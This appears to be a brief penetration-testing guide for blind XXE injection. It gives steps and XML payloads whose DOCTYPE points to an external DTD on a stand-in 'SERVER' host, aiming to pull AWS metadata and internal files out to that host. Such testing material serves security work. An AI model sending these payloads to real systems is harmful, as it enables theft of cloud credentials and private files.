## Use case

The application was vulnerable to blind XXE injection, allowing the attacker to retrieve sensitive AWS metadata and internal server files without direct feedback in the response. This vulnerability is critical as it can expose sensitive information and lead to further exploitation.

## Steps to test

1. Identify an endpoint that accepts XML input and check the response headers for 'Accept: application/xml'.
2. Craft an XML payload with a DOCTYPE declaration pointing to an external DTD file hosted on your server, e.g., '<?xml version="1.0"?> <!DOCTYPE foo SYSTEM "http://SERVER:443/aws.dtd">'.
3. Send the crafted XML payload as a POST request to the identified endpoint.
4. Create an external DTD file (aws.dtd) that defines entities to fetch sensitive data from the AWS metadata service.
5. Monitor your server for incoming requests to confirm if the metadata was accessed.
6. Repeat the process with a different payload to read internal files, e.g., '<?xml version="1.0"?> <!DOCTYPE foo SYSTEM "http://SERVER:443/file.dtd"> <foo>&attack;</foo>'.

## Commands

```text
<?xml version="1.0"?> <!DOCTYPE foo SYSTEM "http://SERVER:443/aws.dtd">
<?xml version="1.0"?> <!DOCTYPE foo SYSTEM "http://SERVER:443/file.dtd"> <foo>&attack;</foo>
<?xml version="1.0"?>
<!DOCTYPE foo SYSTEM "http://SERVER:443/">
```
